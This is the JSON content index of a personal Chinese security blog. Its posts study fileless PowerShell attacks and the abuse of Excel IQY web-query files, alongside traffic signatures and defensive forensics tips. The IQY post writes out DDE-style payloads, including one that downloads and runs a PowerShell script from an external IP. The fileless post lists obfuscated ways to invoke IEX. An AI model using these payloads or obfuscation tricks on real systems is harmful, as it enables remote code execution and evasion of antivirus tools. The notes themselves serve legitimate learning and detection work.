{"meta":{"title":"hait`blogs","subtitle":"","description":"","author":"hait jia","url":"https://xiaoxiaowensheng.github.io","root":"/"},"pages":[{"title":"友情链接","text":"","path":"links/index.html"}],"posts":[{"title":"无文件攻击学习","text":"无文件攻击学习无文件攻击介绍“无文件攻击”是指恶意程序文件没有直接落地到目标系统的磁盘空间的攻击手法，一般情况下，“无文件攻击”会把攻击载荷直接载入到内存空间中执行，或者依附于合法的系统进程来进行恶意操作。 “无文件攻击”的发展“无文件攻击”起源完全驻留在内存中的恶意代码在21世纪前就已经出现，无需落地在目标的磁盘 • 2001年，红色代码事件才将“无文件恶意软件”一次带给公众 • 2003年，Slammer蠕虫是另一个经典的“无文件恶意软件”实例 现代“无文件攻击”的异同现代的“无文件攻击”大多是基于Powershell的 • 整个攻击链、攻击步骤完全无文件 • 恶意代码依附于可信的系统进程，也称为“无文件攻击” • “无文件攻击”极其善于躲避检测、对抗杀软 常见“无文件”攻击技术解析 https://www.jianshu.com/p/cb75c0d70c45 案例分析学习驱动人生挖矿蠕虫攻击过程分析（powershell分析）趋势针对驱动人生事件介绍： https://blog.trendmicro.com/trendlabs-security-intelligence/monero-mining-malware-pcastle-zeroes-back-in-on-china-now-uses-multilayered-fileless-arrival-techniques/ 腾讯对驱动人生介绍： https://s.tencent.com/research/report/768.html mig.ps1（最初的起始powershell文件）沙箱运行：【比较详细】 https://app.any.run/tasks/8586e6bb-6236-40d0-b608-ca6e466aa022/ m6pe（最终挖矿样本）沙箱运行： http://tq.research.qianxin-inc.cn/tq/report/toViewReport.do?rid=00c9c724043ce628ce8109a3826f8f2b&amp;sk=006363 使用write-host，write-output **** | out-file -filepathC:\\temp\\a.txt替换IEX进行解密： 期间混淆使用替换IEX的代码： IEX： $pSHoMe[4]+$pshomE[34]+’x’ $env:coMSpEc[4,26,25]-jOiN’’ $pSHomE[21]+$PSHoME[30]+’x’ $sHEllid[1]+$sHElLID[13]+’x’ $env:ComspeC[4,15,25]-JoIN’’ (GeT-VAriaBlE ‘*Mdr*‘).NaMe[3,11,2]-JOiN’’ 利用WMI构建无文件后门https://www.freebuf.com/column/165235.html GhostMiner解析：无文件挖矿的新姿势https://www.freebuf.com/articles/blockchain-articles/170807.html 针对JS_POWMET无文件恶意软件的分析https://bbs.pediy.com/thread-220646.htm 防御手段取证并非毫无头绪的，病毒本身必然有网络行为，内存必然有其二进制代码，它要么是单独的进程模块，要么是进程的dll/so模块，通常，为了保活，它极可能还有自己的启动项、网络心跳包。 流量、内存、模块、启动项。","path":"2020/01/23/无文件攻击学习/"},{"title":"iqy学习","text":"iqy学习 知识点 IQY 到底是什么内置在 excel 中的一种特殊的’web 浏览器’,通过 IQY[即 web 查询]语句,可以直接将各类web 上的列表数据轻松引入到当前的 excel中，当打开该文件时将执行Web查询或远程命令。 IQY 怎么用？ 直接excel数据导入： 流量特征： 导入过程存在多次http请求，其中包括HEAD、OPTION、GET方法，使用agent不同： GET：User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; wbx 1.0.0; ms-office) OPTIONS：User-Agent: Microsoft Office Protocol Discovery HEAD：User-Agent: Microsoft Office Existence Discovery 这种方法如果是可执行文件提示是否执行： User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; wbx 1.0.0) 点击运行： GET请求txt文件内容之前有4次OPTION请求,然后GET请求： OPTIONS：User-Agent:Microsoft Office Protocol Discovery GRT：User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64;Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NETCLR 3.5.30729; wbx 1.0.0; ms-office) 恶意利用IQY执行payloadexcel会加载远程拉取的内容，如果是程序会去执行 excel===&gt;&gt;cmd运行命令 ***可以自己写iqy文件，也可以调用nishang上的powershell 举例说明： 远程代码：=cmd|‘/c calc.exe’!A0 流量上还是一样： GET请求txt文件内容之前有4次OPTION请求,然后GET请求： OPTIONS：User-Agent:Microsoft Office Protocol Discovery User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64;Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NETCLR 3.5.30729; wbx 1.0.0; ms-office) GET请求txt文件内容之前有4次OPTION请求 把calc.exe替换成其他的命令也是一样的，包括CS，msf，empire的上线 失败测试：=cmd|‘/c powershell “IEX (New-ObjectNet.WebClient).DownloadString(‘http://118.24.24.45/1.ps1&#39;)&quot;&#39;!A0 ‘和“不能加一层包裹 成功测试：=cmd|‘/c powershell invoke-webrequest“http://118.24.24.45:9999/1.ps1&quot; -outfile “$env:temp\\2.ps1”;start-process“C:\\Users\\jiahaitao01\\Desktop\\2.ps1”’!A0 测试最新版win10 +office19 User-Agent: Microsoft Office Excel 2014 User-Agent: Microsoft Office Protocol Discovery\\r\\n User-Agent: Microsoft Office Excel\\r\\n User-Agent: Mozilla/4.0 (compatible; ms-office)\\r\\n 失败，不能执行命令 案例分析利用IQY(Excel Web Query)文件分发https://mp.weixin.qq.com/s?__biz=MzA4ODEyODA3MQ==&amp;mid=2247485241&amp;idx=1&amp;sn=05c4556273b546e7bd7637650edacda1 powershell学习 https://github.com/HugoWw/Powershell/tree/b0273d65ebd25c523e8a7443088d736fc75ec783/nishang-master","path":"2020/01/23/iqy学习/"},{"title":"安全分析","text":"威胁分析业务部","path":"2020/01/22/安全分析/"}]}